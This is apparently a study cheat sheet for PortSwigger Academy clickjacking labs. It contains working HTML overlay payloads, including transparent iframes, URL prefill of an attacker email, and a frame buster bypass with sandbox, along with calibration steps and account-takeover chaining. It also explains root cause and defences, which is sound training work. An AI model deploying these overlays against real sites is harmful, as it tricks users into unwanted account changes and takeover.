# Clickjacking — Basic overlay, URL prefill, and frame buster bypass

Overlay transparent iframe over victim page → align decoy button with target button → victim clicks. Variants: prefill form fields via URL params so the victim submits a pre-crafted value; bypass frame busters (JS `if (top != self)` checks) with `sandbox="allow-forms"`.

## Quick reference
```html
<!-- Basic: delete account -->
<style>
iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
div { position:absolute; top:300px; left:60px; z-index:1; }
</style>
<div>Click me</div>
<iframe src="https://LAB-ID.web-security-academy.net/my-account"></iframe>

<!-- Prefill: change email to attacker's -->
<iframe src="https://LAB-ID.web-security-academy.net/my-account?email=hacker@attacker.com"></iframe>
<!-- adjust top:400px left:80px to align "Update email" button -->

<!-- Frame buster bypass: sandbox disables top.location JS redirect -->
<iframe sandbox="allow-forms"
  src="https://LAB-ID.web-security-academy.net/my-account?email=hacker@attacker.com"></iframe>
```

## Root cause
No `X-Frame-Options` / `CSP frame-ancestors` → page loads in iframe. CSS `opacity: 0` hides the iframe but keeps it clickable. `z-index: 2` on iframe means clicks land on it, not the div underneath. Frame buster JS (`top.location = self.location`) is neutralized by `sandbox` attribute (disables JS in sandboxed iframe, but `allow-forms` still permits form submission).

## Find it
1. Check response headers for `X-Frame-Options: DENY/SAMEORIGIN` or `CSP: frame-ancestors` — if absent → frameable.
2. Identify one-click actions: delete account, change email, make payment.
3. Check if form fields can be prefilled via URL params (look at GET params on the account page URL).
4. Test if page has frame buster: view source → search for `top.location`, `top == self`, `parent != self`.

## Technique
1. On exploit server, paste the template (CSS + div + iframe).
2. Set iframe src to the target action page.
3. Use `opacity: 0.1` initially to see both layers.
4. Adjust `top` and `left` in the div style until the decoy text sits over the target button.
5. Verify: hover over "Test me" — cursor should change to pointer (indicating button beneath).
6. Change opacity to `0.0001`, change div text to "Click me".
7. Store → Deliver exploit to victim.

**Prefill variant:** append `?email=hacker@attacker.com` to iframe src — the form auto-populates with the attacker's email; victim just clicks "Update email".

**Frame buster bypass:** add `sandbox="allow-forms"` to iframe → JS inside iframe (including `top.location`) is blocked; forms still submit.

## Payload arsenal
```html
<!-- Calibration (opacity 0.1) -->
<style>
iframe { position:relative; width:500px; height:700px; opacity:0.1; z-index:2; }
div { position:absolute; top:300px; left:60px; z-index:1; }
</style>
<div>Test me</div>
<iframe src="https://LAB-ID.web-security-academy.net/my-account"></iframe>

<!-- Final attack (opacity 0.0001) — adjust top/left to match -->
<style>
iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
div { position:absolute; top:300px; left:60px; z-index:1; }
</style>
<div>Click me</div>
<iframe src="https://LAB-ID.web-security-academy.net/my-account"></iframe>
```

## Bypasses
| Defense | Bypass |
|---|---|
| Frame buster JS (`top.location`) | `sandbox="allow-forms"` — disables JS in iframe |
| X-Frame-Options: SAMEORIGIN | No bypass (host on same domain, e.g., via XSS) |
| CSP frame-ancestors | No bypass from external origin |

## Exploitation walkthrough
**Basic (delete account):** Calibrate with opacity 0.1 → align div at ~top:300px left:60px over "Delete account" → opacity 0.0001, text "Click me" → deliver to victim → lab solved.

**Prefill (change email):** `?email=hacker@attacker.com` in iframe src → form pre-fills → align div at ~top:400px left:80px over "Update email" → deliver → email changed to attacker's.

**Frame buster bypass:** Same as prefill but add `sandbox="allow-forms"` to iframe → frame buster JS doesn't run → form submits normally.

## Chaining
- Changed email → request password reset → account takeover → [Authentication](../../Authentication/)
- Deleted account → denial of service
- Combine with [CSRF](../../CSRF/) (CSRF token lives in the framed page; victim submits it unknowingly)

## Tools
- **Exploit server** — host HTML, calibrate position visually
- Adjust `top` and `left` in 10–20px increments while previewing

## Labs

### Basic clickjacking with CSRF token protection [Apprentice]
Transparent iframe over /my-account → decoy div aligned with "Delete account" button. CSRF token in the hidden page is submitted automatically. Key insight: clickjacking bypasses CSRF token protection because the token is submitted from the legitimate page context.

### Clickjacking with form input data prefilled from a URL parameter [Apprentice]
`/my-account?email=hacker@attacker.com` prefills the email field → victim clicks "Update email" unknowingly. Align div with "Update email" button (~top:400px). Key insight: URL prefill makes any form action a one-click clickjack target.

### Clickjacking with a frame buster script [Apprentice]
Same as prefill, but page has `top.location` frame buster. `sandbox="allow-forms"` on iframe kills the JS → form still submits. Key insight: `sandbox` attribute neutralizes frame busters while permitting form submission.

## Real-world notes
- Frame busters via JS are completely defeated by `sandbox="allow-forms"` — the only real defense is `X-Frame-Options` or CSP `frame-ancestors`.
- URL-prefillable forms are extremely common (email change, account settings) and dramatically lower the user-interaction bar.

## References
- https://portswigger.net/web-security/clickjacking
